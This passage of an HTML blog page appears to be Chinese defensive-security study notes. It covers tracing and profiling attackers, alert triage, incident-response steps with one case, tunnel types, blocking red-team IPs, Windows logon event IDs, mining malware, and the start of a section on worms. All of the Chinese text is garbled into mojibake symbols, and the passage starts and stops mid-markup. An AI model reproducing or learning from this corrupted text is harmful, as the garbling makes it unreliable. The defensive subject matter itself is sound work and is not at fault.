title="Ê∫ØÊ∫êÂèçÂà∂ÁöÑÊÄùË∑ØÔºü"></a><strong>Ê∫ØÊ∫êÂèçÂà∂ÁöÑÊÄùË∑ØÔºü</strong></h2><p>1.ÊîªÂáªÊ∫êÊçïËé∑</p><ul><li>ÂÆâÂÖ®ËÆæÂ§áÊä•Ë≠¶ÔºåÂ¶ÇÊâ´ÊèèIP„ÄÅÂ®ÅËÉÅÈòªÊñ≠„ÄÅÁóÖÊØíÊú®È©¨„ÄÅÂÖ•‰æµ‰∫ã‰ª∂Á≠â</li><li>Êó•Âøó‰∏éÊµÅÈáèÂàÜÊûêÔºåÂºÇÂ∏∏ÁöÑÈÄöËÆØÊµÅÈáè„ÄÅÊîªÂáªÊ∫ê‰∏éÊîªÂáªÁõÆÊ†áÁ≠â</li><li>ÊúçÂä°Âô®ËµÑÊ∫êÂºÇÂ∏∏ÔºåÂºÇÂ∏∏ÁöÑÊñá‰ª∂„ÄÅË¥¶Âè∑„ÄÅËøõÁ®ã„ÄÅÁ´ØÂè£ÔºåÂêØÂä®È°π„ÄÅËÆ°Âàí‰ªªÂä°ÂíåÊúçÂä°Á≠â</li><li>ÈÇÆ‰ª∂ÈíìÈ±ºÔºåËé∑ÂèñÊÅ∂ÊÑèÊñá‰ª∂Ê†∑Êú¨„ÄÅÈíìÈ±ºÁΩëÁ´ô URL Á≠â</li><li>ËúúÁΩêÁ≥ªÁªüÔºåËé∑ÂèñÊîªÂáªËÄÖ ID„ÄÅÁîµËÑë‰ø°ÊÅØ„ÄÅÊµèËßàÂô®ÊåáÁ∫π„ÄÅË°å‰∏∫„ÄÅÊÑèÂõæÁöÑÁõ∏ÂÖ≥‰ø°ÊÅØ</li></ul><p> 2.Ê∫ØÊ∫êÂèçÂà∂</p><ul><li>IP ÂÆö‰ΩçÊäÄÊúØ<br>Ê†πÊçÆIPÂÆö‰ΩçÁâ©ÁêÜÂú∞ÂùÄ‚Äì‰ª£ÁêÜ   IP<br>Ê∫ØÊ∫êÊ°à‰æãÔºöÈÄöËøá IP Á´ØÂè£Êâ´ÊèèÔºåÂèçÂêëÊ∏óÈÄèÊúçÂä°Âô®ËøõË°åÂàÜÊûêÔºåÊúÄÁªàÂÆö‰ΩçÂà∞ÊîªÂáªËÄÖÁõ∏ÂÖ≥‰ø°ÊÅØ</li><li>ID ËøΩË∏™ÊúØ<br>ID ËøΩË∏™ÊúØÔºåÊêúÁ¥¢ÂºïÊìé„ÄÅÁ§æ‰∫§Âπ≥Âè∞„ÄÅÊäÄÊúØËÆ∫Âùõ„ÄÅÁ§æÂ∑•Â∫ìÂåπÈÖç<br>Ê∫ØÊ∫êÊ°à‰æãÔºöÂà©Áî® ID ‰ªéÊäÄÊúØËÆ∫ÂùõËøΩÊ∫ØÈÇÆÁÆ±ÔºåÁªßÁª≠ÈÄöËøáÈÇÆÁÆ±ÂèçËøΩË∏™ÁúüÂÆûÂßìÂêçÔºåÈÄöËøáÂßìÂêçÊâæÂà∞Áõ∏ÂÖ≥ÁÆÄÂéÜ‰ø°ÊÅØ</li><li>ÁΩëÁ´ô url<br>ÂüüÂêç Whois Êü•ËØ¢‚ÄìÊ≥®ÂÜå‰∫∫ÂßìÂêç„ÄÅÂú∞ÂùÄ„ÄÅÁîµËØùÂíåÈÇÆÁÆ±   ‚ÄìÂüüÂêçÈöêÁßÅ‰øùÊä§<br>Ê∫ØÊ∫êÊ°à‰æãÔºöÈÄöËøáÊîªÂáª IP ÂéÜÂè≤Ëß£ÊûêËÆ∞ÂΩï&#x2F;ÂüüÂêçÔºåÂØπÂüüÂêçÊ≥®ÂÜå‰ø°ÊÅØËøõË°åÊ∫ØÊ∫êÂàÜÊûê</li><li>ÊÅ∂ÊÑèÊ†∑Êú¨ÂàÜÊûê<br>ÊèêÂèñÊ†∑Êú¨ÁâπÂæÅ„ÄÅÁî®Êà∑Âêç„ÄÅID„ÄÅÈÇÆÁÆ±„ÄÅC2 ÊúçÂä°Âô®Á≠â‰ø°ÊÅØ‚ÄìÂêåÊ∫êÂàÜÊûê<br>Ê∫ØÊ∫êÊ°à‰æãÔºöÊ†∑Êú¨ÂàÜÊûêËøáÁ®ã‰∏≠ÔºåÂèëÁé∞ÊîªÂáªËÄÖÁöÑ‰∏™‰∫∫ ID Âíå QQÔºåÊàêÂäüÂÆö‰ΩçÂà∞ÊîªÂáªËÄÖ</li><li>Á§æ‰∫§Ë¥¶Âè∑<br>Âü∫‰∫é JSONP Ë∑®ÂüüÔºåËé∑ÂèñÊîªÂáªËÄÖÁöÑ‰∏ªÊú∫‰ø°ÊÅØ„ÄÅÊµèËßàÂô®‰ø°ÊÅØ„ÄÅÁúüÂÆû IP ÂèäÁ§æ‰∫§‰ø°ÊÅØÁ≠â<br>Âà©Áî®Êù°‰ª∂ÔºöÂèØ‰ª•ÊâæÂà∞Áõ∏ÂÖ≥Á§æ‰∫§ÁΩëÁ´ôÁöÑ jsonp Êé•Âè£Ê≥ÑÈú≤ÊïèÊÑü‰ø°ÊÅØÔºåÁõ∏ÂÖ≥ÁΩëÁ´ôÁôªÂΩïÊú™Ê≥®ÈîÄ</li></ul><p> 3.ÊîªÂáªËÄÖÁîªÂÉè</p><ul><li>ÊîªÂáªË∑ØÂæÑ</li></ul><p>ÊîªÂáªÁõÆÁöÑÔºöÊãøÂà∞ÊùÉÈôê„ÄÅÁ™ÉÂèñÊï∞ÊçÆ„ÄÅËé∑ÂèñÂà©Áõä„ÄÅDDOS Á≠â<br>ÁΩëÁªú‰ª£ÁêÜÔºö‰ª£ÁêÜ IP„ÄÅË∑≥ÊùøÊú∫„ÄÅC2 ÊúçÂä°Âô®Á≠â<br>ÊîªÂáªÊâãÊ≥ïÔºöÈ±ºÂèâÂºèÈÇÆ‰ª∂ÈíìÈ±º„ÄÅWebÊ∏óÈÄè„ÄÅÊ∞¥ÂùëÊîªÂáª„ÄÅËøëÊ∫êÊ∏óÈÄè„ÄÅÁ§æ‰ºöÂ∑•Á®ãÁ≠â</p><ul><li>ÊîªÂáªËÄÖË∫´‰ªΩÁîªÂÉè</li></ul><p>ËôöÊãüË∫´‰ªΩÔºöID„ÄÅÊòµÁß∞„ÄÅÁΩëÂêç<br>ÁúüÂÆûË∫´‰ªΩÔºöÂßìÂêç„ÄÅÁâ©ÁêÜ‰ΩçÁΩÆ<br>ËÅîÁ≥ªÊñπÂºèÔºöÊâãÊú∫Âè∑„ÄÅqq&#x2F;ÂæÆ‰ø°„ÄÅÈÇÆÁÆ±<br>ÁªÑÁªáÊÉÖÂÜµÔºöÂçï‰ΩçÂêçÁß∞„ÄÅËÅå‰Ωç‰ø°ÊÅØ</p><h2 id="Á†îÂà§ÁöÑÊÄùË∑ØÔºü"><a href="#Á†îÂà§ÁöÑÊÄùË∑ØÔºü" class="headerlink" title="Á†îÂà§ÁöÑÊÄùË∑ØÔºü"></a><strong>Á†îÂà§ÁöÑÊÄùË∑ØÔºü</strong></h2><p>1.È¶ñÂÖàÂØπ<strong>ÊîªÂáªÁöÑÊù•Ê∫ê</strong>ËøõË°åÂà§Êñ≠ÔºåÊòØÂÜÖÂØπÂÜÖÔºåÂ§ñÂØπÂÜÖËøòÊòØÂÜÖÂØπÂ§ñÁöÑÊÉÖÂÜµ„ÄÇ</p><p>2.‰æùÊçÆËÆæÂ§áÁöÑÂëäË≠¶‰ø°ÊÅØÁªìÂêàÂÖ∑‰ΩìÊÉÖÂÜµÊù•ÂàÜÊûê<strong>ÊîªÂáªË°å‰∏∫ÁöÑÁ±ªÂûã</strong>ÔºåÊØîÂ¶ÇËØ¥ÂëäË≠¶SQLÊ≥®ÂÖ•ÊîªÂáªÔºåÈÇ£Êàë‰ª¨Â∞±ÂéªÊü•Áúã‰∏Ä‰∏ãËØ∑Ê±ÇÊï∞ÊçÆÂåÖÈáåÈù¢ÊòØÂê¶ÊúâÂçïÂºïÂè∑ÔºåSELECTÁ≠âÊïèÊÑüÂ≠óÁ¨¶ÔºåËøîÂõûÊï∞ÊçÆÂåÖÈáåÈù¢ÊòØÂê¶ÊúâSQLËØ≠Ê≥ïÊä•ÈîôÁ≠â‰ø°ÊÅØÔºåÊúâÁöÑËØùÂ∞±ÂèØ‰ª•ÂàùÊ≠•Âà§Êñ≠ËØ•ÊîªÂáªË°å‰∏∫ÊòØSQLÊ≥®ÂÖ•ÊîªÂáª„ÄÇ</p><p>3.ÁÑ∂ÂêéÂ∞±ÊòØ<strong>Ê†πÊçÆÊîªÂáªÁâπÂæÅÊù•ÂàÜÊûê</strong>ÊîªÂáªË°å‰∏∫‰ΩøÁî®‰∫Ü‰ªÄ‰πàÊäÄÊúØÊàñËÄÖËØ¥Â∑•ÂÖ∑ÔºåÊØîÂ¶ÇËØ¥ÊîªÂáªÁöÑÈ¢ëÁéáÔºåÊï∞ÊçÆÂåÖÁöÑ‰ø°ÊÅØÁ≠âÁ≠â„ÄÇÊØîÂ¶ÇËØ¥Âú®‰ΩøÁî®AWVSÊàñËÄÖAPPSCANÁ≠âÂ∑•ÂÖ∑Âú®Êâ´ÊèèÁöÑÊó∂ÂÄôÔºåÂæàÊúâÂèØËÉΩÂú®ËØ∑Ê±ÇÊï∞ÊçÆÂåÖÁöÑuser-agentÈáåÈù¢Â∞±ÊúâÁõ∏ÂÖ≥ÁöÑ‰ø°ÊÅØ„ÄÇÂêåÊ†∑ÁªìÂêàÂëäË≠¶‰ø°ÊÅØÂíåÂÖ∑‰ΩìÊÉÖÂÜµÊù•Âà§Êñ≠ÊîªÂáªË°å‰∏∫ÁöÑÂç±ÂÆ≥Á®ãÂ∫¶ÔºåÊØîÂ¶ÇËØ¥Ê£ÄÊµãÂà∞Â§öÊù°ÊîªÂáªÊàêÂäüÂëäË≠¶ÂíåÂÜÖÂØπÂÜÖÂèäÂÜÖÂØπÂ§ñÊîªÂáªÂëäË≠¶ÔºåËøô‰∏™Êó∂ÂÄôÂ∞±ÈúÄË¶ÅÂ∞ΩÂø´ÁöÑ‰∫§ÁªôÂ∫îÊÄ•ÁªÑ‰∫Ü„ÄÇ</p><p>4.ÁªìÂêàËÆæÂ§áÂëäË≠¶‰ø°ÊÅØÂèäÂÖ∑‰ΩìÊÉÖÂÜµ<strong>ÂàÜÊûêÊîªÂáªÊÑèÂõæ</strong>ÔºåÊØîÂ¶ÇËØ¥ÊîªÂáªËÄÖÁöÑÁõÆÊ†áÊòØ‰∏ªÁ´ôËøòÊòØÊóÅÁ´ôÔºåÊòØ‰∏ªÊú∫ËøòÊòØÂüüÊéßÔºå‰∏çÂêåÁöÑÊîªÂáªÊÑèÂõæÂØπ‰∫éÂêéÁª≠ÁöÑÂ§ÑÁêÜ‰πü‰∏çÂêå„ÄÇ</p><p>5.ÊúÄÂêéÊ†πÊçÆÊàë‰ª¨ÊéåÊè°ÁöÑ‰ø°ÊÅØÈáá<strong>ÂèñÁõ∏Â∫îÁöÑÂ§ÑÁΩÆ</strong>ÊñπÂºèÔºåÊØîÂ¶ÇËØ¥ÂëäË≠¶‰ø°ÊÅØÊòØËØØÊä•ÔºåËØ¥ÊòéËÆæÂ§áÈúÄË¶ÅÁ≠ñÁï•‰ºòÂåñÔºå‰∏çÈúÄË¶ÅÂ§ÑÁΩÆ„ÄÇÂëäË≠¶‰ø°ÊÅØÊòØÂ∞ùËØïÊîªÂáªÔºåÊöÇÊó∂ÂØπËµÑ‰∫ßÊ≤°ÊúâÂΩ±ÂìçÔºåÂ∞±ÈúÄË¶ÅÂêéÁª≠ÊåÅÁª≠ÂÖ≥Ê≥®ÔºåÊîªÂáªÊàêÂäüÊó∂ËÉΩÂ§üÂÅöÂà∞ÂèäÊó∂‰∏äÊä•„ÄÇÂ¶ÇÊûúÂëäË≠¶Á°ÆËÆ§‰∏çÊòØËØØÊä•ÔºåÂπ∂‰∏îÊîªÂáªÊàêÂäüÊó∂ÔºåÊàë‰ª¨Â∞±ÈúÄË¶ÅËøÖÈÄü‰∏äÊä•ÂèäÊó∂ÈááÂèñÂ∫îÊÄ•ÂìçÂ∫î„ÄÇ</p><h2 id="Â∫îÊÄ•ÂìçÂ∫î"><a href="#Â∫îÊÄ•ÂìçÂ∫î" class="headerlink" title="Â∫îÊÄ•ÂìçÂ∫î"></a>Â∫îÊÄ•ÂìçÂ∫î</h2><h3 id="Â∫îÊÄ•ÂìçÂ∫îÂü∫Êú¨ÊµÅÁ®ã"><a href="#Â∫îÊÄ•ÂìçÂ∫îÂü∫Êú¨ÊµÅÁ®ã" class="headerlink" title="Â∫îÊÄ•ÂìçÂ∫îÂü∫Êú¨ÊµÅÁ®ã"></a>Â∫îÊÄ•ÂìçÂ∫îÂü∫Êú¨ÊµÅÁ®ã</h3><p>1.È¶ñÂÖàÂ∫îËØ•ÊòØ<strong>‰ø°ÊÅØÊî∂ÈõÜ</strong>ÔºåÊØîÂ¶ÇËØ¥ÂΩ±ÂìçËåÉÂõ¥ÊúâÂ§öÂ§ßÔºå‰∫ã‰ª∂Á±ªÂûãÊòØ‰ªÄ‰πàÔºåÊ∫êÂ§¥‰∏ªÊú∫ÂíåÊîªÂáªÊÑèÂõæÔºåÊòØÂê¶ÈúÄË¶Å‰øùÈöú‰∏öÂä°Á≠âÁ≠â‰ø°ÊÅØÔºåËøô‰∏ÄÊ≠•ÂèØ‰ª•Â∏ÆÂä©Êàë‰ª¨Êõ¥ÊúâÊïàÁöÑËøõË°å‰∏ã‰∏ÄÊ≠•ÁöÑÈòªÊñ≠ÊîªÂáªË°å‰∏∫„ÄÇ</p><p>2.Êé•‰∏ãÊù•Â∞±ÊòØ<strong>ÁªìÂêàÂ∑≤Áü•ÁöÑ‰ø°ÊÅØÈòªÊñ≠ÊîªÂáªË°å‰∏∫Ôºå‰øùÊä§ËµÑ‰∫ß</strong>„ÄÇÊØîÂ¶ÇËØ¥ÊîªÂáªË°å‰∏∫Â±ÄÈôê‰∫éÊüê‰∏™Á´ôÁÇπÔºå‰∏îÊú™ÈÄ†ÊàêËæÉÂ§ßÊçüÂ§±ÔºåÈÇ£Êàë‰ª¨ÂèØ‰ª•Áõ¥Êé•Â∞ÅÊéâÊîªÂáªËÄÖÁöÑIPÊù•Á°Æ‰øù‰∏öÂä°ÁöÑÊ≠£Â∏∏ËøõË°åÔºåÂΩìÁÑ∂‰πãÂêé‰πüË¶ÅÂØπËøô‰∏™Á´ôÁÇπÊúâ‰∏Ä‰∏™ÊåÅÁª≠ÁöÑÂÖ≥Ê≥®„ÄÇÂ¶ÇÊûúÊòØÊüêÂè∞‰∏ªÊú∫Ê≤¶Èô∑ÊàñËÄÖËØ¥ÂüüÊéßÊúçÂä°Âô®Ê≤¶Èô∑ÔºåÈÇ£‰πàËøôÂ∞±ÁÆóÊØîËæÉÈáçÂ§ßÁöÑÊçüÂ§±Ôºå‰∏∫‰∫ÜÈÅøÂÖçÊçüÂ§±Êâ©Â§ßÔºåÂ∫îËØ•ÂèäÊó∂Â∞ÜÊÑüÊüìËÆæÂ§áÊñ≠ÁΩëÂ§ÑÁêÜ„ÄÇÂ¶ÇÊûúÊúâÂ§á‰ªΩÊúçÂä°Âô®ÔºåÂèØ‰ª•ÂàáÊç¢Â§áÁî®ËÆæÂ§áÊù•‰øùÈöú‰∏öÂä°Ê≠£Â∏∏„ÄÇ</p><p>3.<strong>ÂØπÊîªÂáªË°å‰∏∫ÈòªÊñ≠ÂêéÈúÄË¶ÅÂØπÊï∞ÊçÆËøõË°å‰øùÊä§</strong>ÔºåÊØîÂ¶ÇËØ¥‰øùÂ≠òÂ•ΩÊµÅÈáè„ÄÅÂèØÁñëËøõÁ®ãÁöÑÂÜÖÂ≠ò„ÄÅÂ§±Èô∑Á≥ªÁªüÈïúÂÉè„ÄÅÊÅ∂ÊÑèÊ†∑Êú¨„ÄÅËÆæÂ§áÁöÑÊó•ÂøóÔºåËøô‰∏ÄÊ≠•ÂèØ‰ª•ÊúâÊïàÂ∏ÆÂä©Êàë‰ª¨ÂêéÁª≠ÁöÑÊ∫ØÊ∫êÂ∑•‰Ωú„ÄÇ</p><p>4.<strong>ÂÆâÂÖ®‰∫ã‰ª∂ÂΩ±ÂìçÊ†πÈô§</strong>ÔºåÂ∑•ÂÖ∑ÁªìÂêàÊâãÂ∑•‰ªéÁ≥ªÁªüÁî®Êà∑ÊòØÂê¶ÊúâÊñ∞Â¢ûÁî®Êà∑ÔºåËøõÁ®ã‰ø°ÊÅØÔºåËÆ°Âàí‰ªªÂä°ÔºåËá™ÂêØÂä®È°πÔºåÊ≥®ÂÜåË°®ÔºåÁ´ØÂè£Áä∂ÊÄÅ(ÊòØÂê¶ÊúâÂØπÂ§ñËøûÊé•)Á≠âÊñπÈù¢Êù•Ê£ÄÊü•ÊòØÂê¶ÊúâÂèØÁñëË°å‰∏∫ÔºåÊØîÂ¶ÇËØ¥ÁÅ´ÁªíÂâëÔºåProcessHackerÁ≠â‰∏ìÈó®Áî®‰∫éÂàÜÊûêËøô‰∫õÊñπÈù¢ÁöÑÂ∑•ÂÖ∑„ÄÇÂ¶ÇÊûúÊúâÂ∞±Áõ¥Êé•ÂÖ≥Èó≠ÊàñËÄÖÂà†Èô§ÔºåÊúâ‰∏Ä‰∫õÈ°ΩÂõ∫ËøõÁ®ãÊàñËÄÖÈ°ΩÂõ∫Êñá‰ª∂Êó†Ê≥ïÂÖ≥Èó≠ÊàñËÄÖÂà†Èô§ÂèØ‰ª•ÁªìÂêà‰∏ìÊùÄÂ∑•ÂÖ∑Â§ÑÁêÜÔºåÊØîÂ¶ÇËØ¥Rkhunter,ÁÅ´ÁªíÁ≠âÂ∑•ÂÖ∑„ÄÇ</p><p>5.<strong>ÊÅ¢Â§ç‰∏öÂä°</strong>ÔºåÂä†Âº∫ÂÆâÂÖ®Êé™ÊñΩÔºåÂä†Âõ∫Á≥ªÁªüÁ≠âÔºåÊØîÂ¶ÇËØ¥Êõ¥Êñ∞ËΩØ‰ª∂ÁâàÊú¨ÔºåÂÆâË£ÖÂ∑≤Áü•ÊºèÊ¥ûÁöÑË°•‰∏ÅÔºåÂÖ≥Èó≠Êüê‰∫õÁ´ØÂè£Á≠âÁ≠âÔºåÊöÇÊó∂Ê≤°ÊúâËß£ÂÜ≥ÂäûÊ≥ïÁöÑÂèØ‰ª•Ê†πÊçÆ‰∏öÂä°ÈúÄÊ±ÇÂÖ≥Èó≠Êüê‰∫õÊúçÂä°„ÄÇ<br>6.ÊúÄÂêéÂ∞±ÊòØËæìÂá∫Êä•ÂëäÔºåÊÄªÁªìÂèçÊÄù„ÄÇ</p><h3 id="Â∫îÊÄ•ÂìçÂ∫îÊ°à‰æã"><a href="#Â∫îÊÄ•ÂìçÂ∫îÊ°à‰æã" class="headerlink" title="Â∫îÊÄ•ÂìçÂ∫îÊ°à‰æã"></a>Â∫îÊÄ•ÂìçÂ∫îÊ°à‰æã</h3><p>ÊàëÊãø‰∏™‰πãÂâçÁöÑÂ∫îÊÄ•ÊéíÊü•Êù•ËØ¥ÂêßÔºåÂ∞±ÊòØÊàë‰ª¨ËøôËæπÊé•Âà∞ÈÄöÁü•‰ªñ‰ª¨ÂÖ¨Âè∏Âá†Âè∞ÊúçÂä°Âô®ÊúâÈóÆÈ¢òÔºåËÆ©Êàë‰ª¨ÂéªÊ£ÄÊµã„ÄÇÁÑ∂ÂêéÁúãÂà∞ÊòØwindowsÁöÑÊú∫Â≠êÔºåÊú¨Âú∞Áî®Êà∑ÂíåÁªÑÊéíÊü•ÁöÑÊó∂ÂÄôÂèëÁé∞Êñ∞Âª∫ÂèØÁñëÁöÑÁî®Êà∑ÔºåÁ°ÆÂÆö‰∏ªÊú∫ÊòØÊúâÈóÆÈ¢òÁöÑÔºåÂØπÊñπÂ∑≤ÁªèÊãøÂà∞‰∏ªÊú∫ÊùÉÈôê,ÁÑ∂Âêé‰∫ã‰ª∂ÁÆ°ÁêÜÂô®ÊúâÂ§ßÈáèÁöÑÁôªÂΩïÊó•ÂøóÁàÜÁ†¥ÔºåÈááÂèñÁöÑÊé™ÊñΩÊòØÁõ¥Êé•Âà†Èô§ÂèØÁñëÁöÑÂíåÈöêËóèË¥¶Âè∑,ÊéíÊü•ÁôªÂΩïÊó•Âøó,Á°ÆÂÆöÁ≥ªÁªüË¥¶Âè∑Â∑≤Áªè‰∏çÂÆâÂÖ®,Êõ¥Êñ∞‰∫ÜÁÆ°ÁêÜÂëòË¥¶Âè∑,ÂØπÂêØÂä®È°πÂíåÂèØÁñëËøõÁ®ãÂÅö‰∫ÜÊ∏ÖÈô§,Âèñ‰∫Ü‰∏Ä‰ªΩÊ†∑Êú¨ÊãøÂéªÂàÜÊûê,ÈÄöÂëä‰∏äÁ∫ßÁ¥ßÊÄ•‰øÆË°•webÁ´ôÁÇπÁöÑÊºèÊ¥û.</p><h3 id="ÂÜÖÁΩëÈößÈÅìÔºö"><a href="#ÂÜÖÁΩëÈößÈÅìÔºö" class="headerlink" title="ÂÜÖÁΩëÈößÈÅìÔºö"></a>ÂÜÖÁΩëÈößÈÅìÔºö</h3><p>tcpÈößÈÅìÔºöÂü∫Á°ÄÁöÑ TCP Êò†Â∞ÑÔºåÈÄÇÁî®‰∫éÂ§ßÂ§öÊï∞ÊúçÂä°Ôºå‰æãÂ¶Ç<strong>ËøúÁ®ãÊ°åÈù¢„ÄÅSSH</strong></p><p>udpÈößÈÅìÔºöÂü∫Á°ÄÁöÑ UDP Êò†Â∞ÑÔºåÈÄÇÁî®‰∫éÂüüÂêçËß£Êûê„ÄÅÈÉ®ÂàÜÂü∫‰∫é UDP ÂçèËÆÆÁöÑ<strong>Ê∏∏Êàè</strong></p><p>httpÔºöÊê≠Âª∫ÁΩëÁ´ô‰∏ìÁî®Êò†Â∞ÑÔºåÈÄöËøá 80 Á´ØÂè£ËÆøÈóÆ</p><p>httpsÔºöÂ∏¶Êúâ SSL Âä†ÂØÜÁöÑÁΩëÁ´ôÊò†Â∞ÑÔºåÈÄöËøá 443 Á´ØÂè£ËÆøÈóÆÔºåÊò†Â∞ÑÁõÆÊ†áÈúÄË¶ÅÊîØÊåÅ SSL</p><h3 id="Êä§ÁΩëÊó∂ÂØπIPÁöÑÂà§Êñ≠"><a href="#Êä§ÁΩëÊó∂ÂØπIPÁöÑÂà§Êñ≠" class="headerlink" title="Êä§ÁΩëÊó∂ÂØπIPÁöÑÂà§Êñ≠"></a>Êä§ÁΩëÊó∂ÂØπIPÁöÑÂà§Êñ≠</h3><p>Â¶ÇÊûúËØ•IPÂú®Êä§ÁΩëÊúüÈó¥È¢ëÁπÅÂá∫Áé∞ÔºåËÄåÊä§ÁΩë‰πãÂâçÂü∫Êú¨‰∏äÊú™Âá∫Áé∞ËøáÔºåÈÇ£‰πàÊîπIPÂæàÊúâÂèØËÉΩÊòØÁ∫¢ÈòüIP„ÄÇÂç≥Â∞ÅÈîÅËØ•IP„ÄÇ</p><p>Êä§ÁΩë‰∏≠Â∞ÅÈîÅÁ∫¢ÈòüIPÁöÑÊñπÊ≥ïÊúâ‰ª•‰∏ãÂá†ÁßçÔºö</p><ol><li><p>‰ΩøÁî®Èò≤ÁÅ´Â¢ôÔºà<strong>WAF</strong>ÔºâÔºöÈò≤ÁÅ´Â¢ôÂèØ‰ª•ËÆæÁΩÆËßÑÂàôÔºåÂ∞ÜÁ∫¢ÈòüIPÂä†ÂÖ•ÈªëÂêçÂçïÔºå‰ªéËÄåÁ¶ÅÊ≠¢ÂÆÉ‰ª¨ËÆøÈóÆÂèó‰øùÊä§ÁöÑÁΩëÁªúÊàñÁ≥ªÁªü„ÄÇ</p></li><li><p>‰ΩøÁî®ÂÖ•‰æµÊ£ÄÊµãÁ≥ªÁªüÔºà<strong>IDS</strong>ÔºâÔºöÂÖ•‰æµÊ£ÄÊµãÁ≥ªÁªüÂèØ‰ª•ÁõëÊµãÁΩëÁªúÊµÅÈáèÂíåÁ≥ªÁªüË°å‰∏∫ÔºåÂΩìÊ£ÄÊµãÂà∞Á∫¢ÈòüIPÁöÑÊîªÂáªË°å‰∏∫Êó∂ÔºåÂèØ‰ª•Ëá™Âä®Â∞ÜÂÖ∂Âä†ÂÖ•ÈªëÂêçÂçïÊàñËÄÖÈòªÊ≠¢ÂÖ∂ËÆøÈóÆ„ÄÇ</p></li><li><p>‰ΩøÁî®ÂèçÂêë‰ª£ÁêÜÔºàÂ∏∏ËßÅÁöÑÊúâCFÔºâÔºöÂú®ÂèçÂêë‰ª£ÁêÜÊúçÂä°Âô®‰∏äËÆæÁΩÆËßÑÂàôÔºåÂΩìÊ£ÄÊµãÂà∞Á∫¢ÈòüIPÁöÑÊîªÂáªË°å‰∏∫Êó∂ÔºåÂèØ‰ª•Â∞ÜÂÖ∂ËØ∑Ê±ÇÈáçÂÆöÂêëÂà∞‰∏Ä‰∏™ÈîôËØØÈ°µÈù¢ÊàñËÄÖËøõË°åÊã¶Êà™„ÄÇ</p></li><li><h5 id="‰ΩøÁî®IPËøáÊª§Âô®ÔºöÂèØ‰ª•‰ΩøÁî®‰∏ìÈó®ÁöÑIPËøáÊª§Âô®ÔºåÂ∞ÜÁ∫¢ÈòüIPÂä†ÂÖ•ÈªëÂêçÂçï‰∏≠Ôºå‰ªéËÄåÁ¶ÅÊ≠¢ÂÖ∂ËÆøÈóÆÂèó‰øùÊä§ÁöÑÁΩëÁªúÊàñÁ≥ªÁªü„ÄÇ"><a href="#‰ΩøÁî®IPËøáÊª§Âô®ÔºöÂèØ‰ª•‰ΩøÁî®‰∏ìÈó®ÁöÑIPËøáÊª§Âô®ÔºåÂ∞ÜÁ∫¢ÈòüIPÂä†ÂÖ•ÈªëÂêçÂçï‰∏≠Ôºå‰ªéËÄåÁ¶ÅÊ≠¢ÂÖ∂ËÆøÈóÆÂèó‰øùÊä§ÁöÑÁΩëÁªúÊàñÁ≥ªÁªü„ÄÇ" class="headerlink" title="‰ΩøÁî®IPËøáÊª§Âô®ÔºöÂèØ‰ª•‰ΩøÁî®‰∏ìÈó®ÁöÑIPËøáÊª§Âô®ÔºåÂ∞ÜÁ∫¢ÈòüIPÂä†ÂÖ•ÈªëÂêçÂçï‰∏≠Ôºå‰ªéËÄåÁ¶ÅÊ≠¢ÂÖ∂ËÆøÈóÆÂèó‰øùÊä§ÁöÑÁΩëÁªúÊàñÁ≥ªÁªü„ÄÇ"></a>‰ΩøÁî®IPËøáÊª§Âô®ÔºöÂèØ‰ª•‰ΩøÁî®‰∏ìÈó®ÁöÑIPËøáÊª§Âô®ÔºåÂ∞ÜÁ∫¢ÈòüIPÂä†ÂÖ•ÈªëÂêçÂçï‰∏≠Ôºå‰ªéËÄåÁ¶ÅÊ≠¢ÂÖ∂ËÆøÈóÆÂèó‰øùÊä§ÁöÑÁΩëÁªúÊàñÁ≥ªÁªü„ÄÇ</h5></li></ol><h2 id="ÊïèÊÑü‰∫ã‰ª∂id"><a href="#ÊïèÊÑü‰∫ã‰ª∂id" class="headerlink" title="ÊïèÊÑü‰∫ã‰ª∂id:"></a>ÊïèÊÑü‰∫ã‰ª∂id:</h2><p>4624 ÁôªÂΩïÊàêÂäü<br>4625 ÁôªÂΩïÂ§±Ë¥•<br>4634 Ê≥®ÈîÄÊàêÂäü<br>4647 Áî®Êà∑ÂêØÂä®ÁöÑÊ≥®ÈîÄ<br>4672 ‰ΩøÁî®Ë∂ÖÁ∫ßÁî®Êà∑&#x2F;ÁÆ°ÁêÜÂëòÁî®Êà∑ËøõË°åÁôªÂΩï<br>4720 ÂàõÂª∫Áî®Êà∑</p><h2 id="ÊåñÁüøÁóÖÊØí"><a href="#ÊåñÁüøÁóÖÊØí" class="headerlink" title="ÊåñÁüøÁóÖÊØí"></a>ÊåñÁüøÁóÖÊØí</h2><p>ÊåñÁüøÁóÖÊØíÔºöÊ∂àËÄóÁî®Êà∑CPU„ÄÅGPUËµÑÊ∫êÔºåËøõË°åÂ§ßÈáèËøêÁÆóÔºåËé∑ÂèñÂä†ÂØÜË¥ßÂ∏ÅÁöÑÁóÖÊØí„ÄÇ</p><p><img src="https://img-blog.csdnimg.cn/img_convert/96df0c3d9adc28f32537fa7df52fe736.jpg" alt="1"></p><p>ÊîªÂáªËÄÖÈÄöËøáÂêÑÁßçÊâãÊÆµÂ∞ÜÊåñÁüøÁ®ãÂ∫èÊ§çÂÖ•ÂèóÂÆ≥ËÄÖÁöÑËÆ°ÁÆóÊú∫‰∏≠ÔºåÂú®ÂèóÂÆ≥ËÄÖ‰∏çÁü•ÊÉÖÁöÑÊÉÖÂÜµ‰∏ãÂà©Áî®ÂÖ∂ËÆ°ÁÆóÊú∫ÁöÑ‰∫ëÁÆóÂäõËøõË°åÊåñÁüøÔºå‰ªéËÄåËé∑ÂèñÂà©ÁõäÔºåËøôÁ±ªÈùûÊ≥ïÊ§çÂÖ•Áî®Êà∑ËÆ°ÁÆóÊú∫ÁöÑÊåñÁüøÁ®ãÂ∫èÂ∞±ÊòØÊåñÁüøÊú®È©¨„ÄÇ</p><h2 id="Ë†ïËô´ÊÑüÊüì"><a href="#Ë†ïËô´ÊÑüÊüì" class="headerlink" title="Ë†ïËô´ÊÑüÊüì"></a>Ë†ïËô´ÊÑüÊüì</h2><h3 id="ÁªìÊûÑ"><a href="#ÁªìÊûÑ" class="headerlink" title="ÁªìÊûÑ"></a>ÁªìÊûÑ</h3><p>Ë†ïËô´ÁóÖÊØíÁöÑÁ®ãÂ∫èÁªìÊûÑÈÄöÂ∏∏ÂåÖÊã¨‰∏â‰∏™Ê®°ÂùóÔºö [3] 